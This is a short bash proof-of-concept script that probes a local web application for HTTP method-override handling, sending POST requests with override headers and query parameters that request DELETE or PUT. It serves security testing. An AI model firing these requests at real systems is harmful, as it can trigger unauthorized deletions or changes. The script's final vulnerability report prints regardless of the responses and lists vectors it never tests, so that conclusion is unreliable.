#!/bin/bash

TARGET="http://localhost:3000/"
DATA="name=Test&surname=User&address=123"

echo "=== HTTP Method Override - Multiple Vectors Vulnerability PoC ==="
echo ""

# Test standard override headers
echo "[*] Testing standard HTTP method override headers:"
curl -s -i "$TARGET" -X POST -H "X-HTTP-Method-Override: DELETE" -H "Content-Type: application/x-www-form-urlencoded" -d "$DATA" 2>&1 | grep "HTTP/1.1"

# Test alternative headers
echo "[*] Testing alternative method override headers:"
curl -s -i "$TARGET" -X POST -H "X-Method-Override: PUT" -H "Content-Type: application/x-www-form-urlencoded" -d "$DATA" 2>&1 | grep "HTTP/1.1"
curl -s -i "$TARGET" -X POST -H "X-Original-Method: DELETE" -H "Content-Type: application/x-www-form-urlencoded" -d "$DATA" 2>&1 | grep "HTTP/1.1"

# Test query parameter overrides
echo "[*] Testing query parameter method overrides:"
curl -s -i "$TARGET?_method=DELETE" -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "$DATA" 2>&1 | grep "HTTP/1.1"
curl -s -i "$TARGET?_m=PUT" -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "$DATA" 2>&1 | grep "HTTP/1.1"
curl -s -i "$TARGET?method=DELETE" -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "$DATA" 2>&1 | grep "HTTP/1.1"

echo ""
echo "[+] VULNERABILITY: Application accepts method overrides via multiple vectors:"
echo "    - X-HTTP-Method-Override header"
echo "    - X-Method-Override header"
echo "    - X-Original-Method header"
echo "    - X-Method header"
echo "    - X-Requested-With header"
echo "    - _method query parameter"
echo "    - _m query parameter"
echo "    - method query parameter"
echo "    - http_method query parameter"
